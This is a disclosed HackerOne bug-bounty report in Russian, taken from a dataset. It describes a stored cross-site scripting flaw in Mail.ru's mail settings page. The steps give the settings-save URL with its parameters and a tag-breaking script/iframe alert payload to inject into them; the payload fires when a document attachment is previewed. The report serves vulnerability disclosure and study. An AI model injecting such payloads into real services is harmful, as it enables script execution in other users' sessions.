---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '304679'
original_report_id: '304679'
title: XSS ( Работа с письмами )
weakness: Cross-site Scripting (XSS) - Stored
team_handle: mailru
created_at: '2018-01-14T08:29:30.980Z'
disclosed_at: '2018-08-15T17:10:55.036Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
asset_identifier: e.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# XSS ( Работа с письмами )

## Metadata

- HackerOne Report ID: 304679
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: mailru
- Disclosed At: 2018-08-15T17:10:55.036Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1. Заходим в почту.

2. Настройки  - Работа с письмами. 

Получаем GET запросом входящие параметры 

e.mail.ru/settings/save?form_sign=1396862740370223708853387974167995412&form_token=774174727c7148621905010e0f0b07070500030002090507060104090c07020a0800080e0d090707080e0003040315184c424219545d51595516464e4219464657574d5217465b44521c541b5f555a5f1b4b421b5319505040531e4b45185d565a595d551e45406867641b194d545d465453465d4a16425c41425a585445165a5d4741565e56421b5b5a555c&back=messages&MessagesPerPage=1&SnippetsEnabled=1&MsglistCompact=1&threads=1&Send.Reply.IncludeMessage=1&MsglistAfterDelete=1&InsertAddress=1&SendMeAds=1&snippets_readmsg=1

В параметры вставляем скрипт:  
'"> </ div> </ form> </ script> <script> alert (' XSS ') </ script>"> <iframe src = "www.google.com" onload = "alert ('XSS')"> '

Во все кроме  : FROM_SIGN и FROM_TOKEN

3. Cохраняем изменения. 

Добавляем вложение в почте формата  .DOC или другой формат документа.

Нажимаем -  ПРОСМОТРЕТЬ. Получаем хранимую XSS.

## Impact

Новый отчёт.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
